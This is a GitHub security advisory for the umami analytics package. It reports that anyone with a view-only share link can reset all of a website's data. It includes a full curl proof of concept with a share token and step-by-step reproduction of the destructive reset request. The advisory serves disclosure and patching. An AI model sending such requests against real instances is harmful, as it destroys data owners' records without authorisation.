# [C] Anyone with a share link can RESET all website data in Umami

## Summary
Severity: Critical
Advisory: GHSA-8www-cffh-4q98
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2023-07-28
Source: https://github.com/advisories/GHSA-8www-cffh-4q98
Type: github-advisory

## Affected
- npm: `umami` — affected >=0 <2.3.1

## Details
### Summary
Anyone with a share link (permissions to view) can reset the website data.

### Details
When a user navigates to a `/share/` URL, he receives a share token which is used for authentication. This token is later verified by `useAuth`. After the token is verified, the user can call most of the `GET` APIs that allow fetching stats about a website.

The `POST /reset` endpoint is secured using `canViewWebsite` which is the incorrect verification for such destructive action. This makes it possible to completly reset all website data ONLY with view permissions - [permalink](https://github.com/umami-software/umami/blob/7bfbe264852558a148c7741f8637ff2b266d48cd/pages/api/websites/%5Bid%5D/reset.ts#L22)


### PoC
```bash
curl -X POST 'https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset' \
  -H 'authority: analytics.umami.is' \
  -H 'accept: application/json' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'authorization: Bearer undefined' \
  -H 'cache-control: no-cache' \
  -H 'content-type: application/json' \
  -H 'pragma: no-cache' \
  -H 'referer: https://analytics.umami.is/share/bw6MFhkwpwEXFsbd/test' \
  -H 'sec-ch-ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'sec-ch-ua-platform: "Linux"' \
  -H 'sec-fetch-dest: empty' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-site: same-origin' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36' \
  -H 'x-umami-share-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3ZWJzaXRlSWQiOiJiODI1MDYxOC1jY2I1LTQ3ZmItODM1MC0zMWM5NjE2OWExOTgiLCJpYXQiOjE2OTAzNjkxOTl9.zTfwFrfggE5na7rOOgkUobEBm48AH_8WVyh2RgJGzcw' \
  --compressed
```

You can reproduce this by:
* Accessing a website using it's share link
* Copy the `token` received from the the received from the `GET /share/{website-id}`
* Send a POST request to `https://analytics.umami.is/api/websites/b8250618-ccb5-47fb-8350-31c96169a198/reset` with `x-umami-share-token: ` header equal to the token copied in the previous step
* The website data is now cleared

### Impact
Everyone with an open share link exposed to the internet!

## References
- https://github.com/umami-software/umami/security/advisories/GHSA-8www-cffh-4q98
- https://github.com/umami-software/umami/commit/ec48a4e3250e9cefc481b339a90e6ceea6f1ec2b
- https://github.com/umami-software/umami
